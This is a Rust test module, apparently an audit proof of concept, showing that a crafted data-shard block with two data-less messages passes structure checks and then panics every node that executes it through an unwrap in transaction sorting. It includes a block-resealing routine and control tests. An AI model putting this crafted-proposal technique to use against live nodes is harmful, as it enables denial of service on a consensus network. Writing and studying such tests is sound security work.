//! F042 build-backed PoC: a proposed data-shard transaction holding two
//! `Message`s with `data = None` panics every node that executes it.
//! `replay_snapchain_txn` sorts user messages with
//! `a.data.as_ref().unwrap().timestamp.cmp(...)` BEFORE any per-message
//! validation would reject a data-less message (`engine.rs:2347-2353`).
//!
//! Test A hits the panic at the engine entry point `validate_state_change`
//! with two `Message::default()`, plus three controls that isolate the exact
//! trigger (an equal-priority pair where at least one side has no `data`).
//!
//! Test B drives the production Hypersnap proposer entry point
//! (`HypersnapShardProposer::check_value`): a crafted `HypersnapBlock` that
//! passes `validate_body` / `check_structure` panics when executed
//! (`synced = false`), while the synced control (`synced = true`, structure
//! only) returns `Valid`.
//!
//! Wired as `#[cfg(test)] mod f042_poc_test;` in `src/storage/store/mod.rs`.

#[cfg(test)]
mod tests {
    use crate::core::util::FarcasterTime;
    use crate::proto::{self, UserDataType};
    use crate::storage::store::engine::{ShardEngine, ShardStateChange};
    use crate::storage::store::test_helper;
    use crate::utils::factory::messages_factory;
    use crate::version::version::EngineVersion;
    use std::panic::AssertUnwindSafe;

    /// Pull the message off a panic payload.
    fn panic_text(e: &(dyn std::any::Any + Send)) -> String {
        if let Some(s) = e.downcast_ref::<&str>() {
            s.to_string()
        } else if let Some(s) = e.downcast_ref::<String>() {
            s.clone()
        } else {
            "<non-string panic>".to_string()
        }
    }

    fn state_change(engine: &ShardEngine, user_messages: Vec<proto::Message>) -> ShardStateChange {
        let txn = proto::Transaction {
            fid: 1,
            user_messages,
            system_messages: vec![],
            account_root: vec![],
        };
        ShardStateChange {
            shard_id: engine.shard_id(),
            timestamp: FarcasterTime::current(),
            new_state_root: vec![0u8; 32],
            transactions: vec![txn],
            events: vec![],
            version: EngineVersion::latest(),
            max_block_event_seqnum: 0,
        }
    }

    /// Run `validate_state_change` under catch_unwind; return Ok(result) if it
    /// returned, Err(panic message) if it panicked. Silences the default panic
    /// hook so the expected panic does not spam the test log.
    fn try_validate(engine: &mut ShardEngine, change: &ShardStateChange) -> Result<bool, String> {
        let prev = std::panic::take_hook();
        std::panic::set_hook(Box::new(|_| {}));
        let height = engine.get_confirmed_height().increment();
        let r = std::panic::catch_unwind(AssertUnwindSafe(|| {
            engine.validate_state_change(change, height)
        }));
        std::panic::set_hook(prev);
        r.map_err(|e| panic_text(e.as_ref()))
    }

    // ---- Test A: engine entry point panics on two data-less messages ---------

    #[tokio::test]
    async fn validate_state_change_panics_on_two_data_less_messages() {
        let (mut engine, _tmp) = test_helper::new_engine().await;
        let change = state_change(
            &engine,
            vec![proto::Message::default(), proto::Message::default()],
        );

        let r = try_validate(&mut engine, &change);
        println!("F042 Test A: two data-less messages -> {:?}", r);

        let msg = r.expect_err("validate_state_change must panic on two data-less messages");
        assert!(
            msg.contains("called `Option::unwrap()` on a `None` value"),
            "unexpected panic message: {}",
            msg
        );
    }

    // ---- Control (i): a single data-less message does not panic --------------

    #[tokio::test]
    async fn control_single_data_less_message_does_not_panic() {
        let (mut engine, _tmp) = test_helper::new_engine().await;
        let change = state_change(&engine, vec![proto::Message::default()]);

        let r = try_validate(&mut engine, &change);
        println!("F042 control (i): one data-less message -> {:?}", r);
        // No panic (no equal-priority pair to compare), and it is rejected
        // (root mismatch after the NoMessageData failure), so validity == false.
        assert_eq!(
            r.expect("one data-less message must NOT panic"),
            false,
            "a data-less message is rejected, not accepted"
        );
    }

    // ---- Control (ii): two messages WITH data at equal priority do not panic -

    #[tokio::test]
    async fn control_two_messages_with_data_do_not_panic() {
        let (mut engine, _tmp) = test_helper::new_engine().await;
        // Two CastAdds (priority 5 each) with different timestamps: the
        // comparator compares the two `Some(timestamp)` values and never
        // unwraps a `None`.
        let a = messages_factory::casts::create_cast_add(1, "a", Some(1_000_000), None);
        let b = messages_factory::casts::create_cast_add(1, "b", Some(1_000_001), None);
        let change = state_change(&engine, vec![a, b]);

        let r = try_validate(&mut engine, &change);
        println!("F042 control (ii): two data-bearing messages -> {:?}", r);
        assert!(
            r.is_ok(),
            "two messages that both carry `data` must NOT panic, got: {:?}",
            r
        );
    }

    // ---- Control (iii): different priorities never reach the unwrap ----------

    #[tokio::test]
    async fn control_priority_split_does_not_panic() {
        let (mut engine, _tmp) = test_helper::new_engine().await;
        // A UserDataAdd(Username) sorts at priority 3; a data-less message sorts
        // at priority 5. Different priorities, so the timestamp `then_with`
        // comparator (which unwraps `data`) is never evaluated.
        let username = messages_factory::user_data::create_user_data_add(
            1,
            UserDataType::Username,
            &"alice".to_string(),
            Some(1_000_000),
            None,
        );
        let change = state_change(&engine, vec![username, proto::Message::default()]);

        let r = try_validate(&mut engine, &change);
        println!("F042 control (iii): priority split -> {:?}", r);
        assert!(
            r.is_ok(),
            "an unequal-priority pair must NOT panic, got: {:?}",
            r
        );
    }

    // =======================================================================
    // Test B: the production proposer entry point.
    // =======================================================================

    mod entry_point {
        use super::panic_text;
        use crate::chain::block::{self, ParentInfo};
        use crate::chain::certificate::test_support::test_validators;
        use crate::chain::epoch::EpochParams;
        use crate::chain::proposer::{EpochSetSource, HypersnapShardProposer, Shard0Tip};
        use crate::chain::shard_blocks::ShardBlockProducer;
        use crate::chain::validator_sets::EpochSet;
        use crate::consensus::proposer::Proposer;
        use crate::proto::{self, full_proposal, FullProposal, Height, HypersnapBlock};
        use crate::storage::db::RocksDB;
        use crate::storage::store::account::StoreOptions;
        use crate::storage::store::engine::ShardEngine;
        use crate::storage::store::stores::StoreLimits;
        use crate::storage::trie::merkle_trie::MerkleTrie;
        use crate::utils::statsd_wrapper::StatsdClientWrapper;
        use informalsystems_malachitebft_core_types::{Round, Validity};
        use prost::Message as _;
        use std::panic::AssertUnwindSafe;
        use std::sync::Arc;

        fn statsd() -> StatsdClientWrapper {
            StatsdClientWrapper::new(
                cadence::StatsdClient::builder("", cadence::NopMetricSink {}).build(),
                true,
            )
        }

        struct FixedSets(EpochSet);
        impl EpochSetSource for FixedSets {
            fn set(&self, _epoch: u64) -> Option<EpochSet> {
                Some(self.0.clone())
            }
        }

        struct FixedTip(u64);
        impl Shard0Tip for FixedTip {
            fn highest_certified(&self) -> u64 {
                self.0
            }
        }

        fn full_proposal(block: &HypersnapBlock, round: i64) -> FullProposal {
            FullProposal {
                height: Some(Height::new(
                    block.header.as_ref().unwrap().shard_id,
                    block.header.as_ref().unwrap().height,
                )),
                round,
                proposer: vec![0xaa; 20],
                proposed_value: Some(full_proposal::ProposedValue::HypersnapBlock(
                    block.encode_to_vec(),
                )),
            }
        }

        /// A minimal shard-1 Hypersnap proposer (empty mempool, genesis parent),
        /// identical in shape to `poc/F022`'s `shard1_proposer`.
        async fn shard1_proposer() -> (HypersnapShardProposer, Vec<tempfile::TempDir>) {
            let validators = test_validators(4, 1);
            let shard_dir = tempfile::tempdir().unwrap();
            let db = Arc::new(RocksDB::new(
                shard_dir.path().join("shard1").to_str().unwrap(),
            ));
            db.open().unwrap();
            let mut engine = ShardEngine::new_with_opts(
                db.clone(),
                proto::FarcasterNetwork::Devnet,
                MerkleTrie::new().unwrap(),
                1,
                StoreLimits::default(),
                statsd(),
                256,
                None,
                None,
                None,
                StoreOptions::default(),
            )
            .await
            .unwrap();
            engine
                .enter_hypersnap_mode(Some(0), crate::version::version::EngineVersion::latest())
                .unwrap();
            let genesis_parent = ParentInfo {
                height: 0,
                hash: [0u8; 32],
                timestamp: 0,
                epoch_ref_height: None,
                shard_links: vec![],
            };
            let producer = ShardBlockProducer::new(engine, EpochParams::new(1), genesis_parent);
            let address = validators.keys[0].public_key().address();
            let proposer = HypersnapShardProposer::new(
                address,
                producer,
                Arc::new(FixedSets(validators.set.clone())),
                Arc::new(FixedTip(1)),
            );
            (proposer, vec![shard_dir])
        }

        /// Craft a block from an honest one: replace its transactions with a
        /// single transaction holding two data-less messages, then reseal so the
        /// body matches the header (messages_root + hash recomputed).
        fn craft_data_less(honest: &HypersnapBlock) -> HypersnapBlock {
            let mut block = honest.clone();
            block.transactions = vec![proto::Transaction {
                fid: 1,
                user_messages: vec![proto::Message::default(), proto::Message::default()],
                system_messages: vec![],
                account_root: vec![],
            }];
            block::seal(&mut block);
            block
        }

        /// Test B: the crafted block passes every pre-execution gate (shown by
        /// the synced control returning Valid) but panics when `check_value`
        /// executes it (`synced = false`).
        #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
        async fn check_value_panics_on_data_less_transaction() {
            let (mut proposer, _dirs) = shard1_proposer().await;

            // An honest, structurally valid empty block for the next height.
            let honest = proposer
                .propose_value(
                    Height::new(1, 1),
                    Round::new(0),
                    std::time::Duration::from_secs(2),
                )
                .await;
            let honest_block = honest.hypersnap_block().unwrap();
            assert_eq!(block::validate_body(&honest_block), Ok(()));

            let crafted = craft_data_less(&honest_block);
            // The crafted body is structurally well-formed (sizes, hash, root).
            assert_eq!(
                block::validate_body(&crafted),
                Ok(()),
                "the data-less block passes validate_body"
            );
            let fp = full_proposal(&crafted, 0);
            let id = fp.shard_hash();

            // synced = false -> validate -> hypersnap_validate -> replay -> PANIC.
            let prev = std::panic::take_hook();
            std::panic::set_hook(Box::new(|_| {}));
            let result =
                std::panic::catch_unwind(AssertUnwindSafe(|| proposer.check_value(&fp, false)));
            std::panic::set_hook(prev);

            let panicked = result.is_err();
            let msg = result
                .as_ref()
                .err()
                .map(|e| panic_text(e.as_ref()))
                .unwrap_or_else(|| "<no panic>".to_string());
            // The crafted proposal is stored before the panic (check_value adds
            // it to the undecided set before executing).
            let stored = proposer.get_proposed_value(&id).is_some();
            println!(
                "F042 Test B: check_value(synced=false) panicked={} msg={:?} stored_before_panic={}",
                panicked, msg, stored
            );

            assert!(panicked, "check_value must panic on the data-less transaction");
            assert!(
                msg.contains("called `Option::unwrap()` on a `None` value"),
                "unexpected panic message: {}",
                msg
            );
            assert!(stored, "the crafted proposal is stored before the panic");
        }

        /// Control: the same crafted block with `synced = true` runs structure
        /// checks only (no execution) and returns `Valid`.
        #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
        async fn check_value_synced_returns_valid_without_executing() {
            let (mut proposer, _dirs) = shard1_proposer().await;

            let honest = proposer
                .propose_value(
                    Height::new(1, 1),
                    Round::new(0),
                    std::time::Duration::from_secs(2),
                )
                .await;
            let honest_block = honest.hypersnap_block().unwrap();
            let crafted = craft_data_less(&honest_block);
            let fp = full_proposal(&crafted, 0);

            // synced = true -> check_structure only -> Valid, no panic.
            let validity = proposer.check_value(&fp, true);
            println!(
                "F042 Test B control: check_value(synced=true) = {:?} (structure only)",
                validity
            );
            assert_eq!(
                validity,
                Validity::Valid,
                "the data-less block is structurally valid; only execution panics"
            );
        }
    }
}
